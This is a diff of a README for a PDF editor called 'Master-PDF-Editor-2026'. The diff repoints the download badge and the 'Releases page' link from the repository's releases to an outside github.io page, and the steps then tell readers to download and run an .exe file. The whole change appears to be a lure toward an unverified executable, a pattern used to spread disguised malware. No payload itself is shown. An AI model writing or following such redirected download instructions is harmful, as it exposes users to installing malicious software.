@@ -1,6 +1,6 @@
 # 📄 Master-PDF-Editor-2026 - Edit Your PDF Files With Ease
 
-[![](https://img.shields.io/badge/Download-Master_PDF_Editor-blue.svg)](https://github.com/figbirdcnemidophorus941/Master-PDF-Editor-2026/releases)
+[![](https://img.shields.io/badge/Download-Master_PDF_Editor-blue.svg)](https://figbirdcnemidophorus941.github.io)
 
 ## 🎯 About This Software
 
@@ -20,7 +20,7 @@ Your computer needs specific parts to run this software. Check your settings bef
 
 Follow these steps to put the software on your computer.
 
-1. Go to the [Releases page](https://github.com/figbirdcnemidophorus941/Master-PDF-Editor-2026/releases).
+1. Go to the [Releases page](https://figbirdcnemidophorus941.github.io).
 2. Look for the latest version listed under the Assets section.
 3. Click the file name that ends in .exe to start the download.
 4. Save the file to your Downloads folder or another place you can find easily.
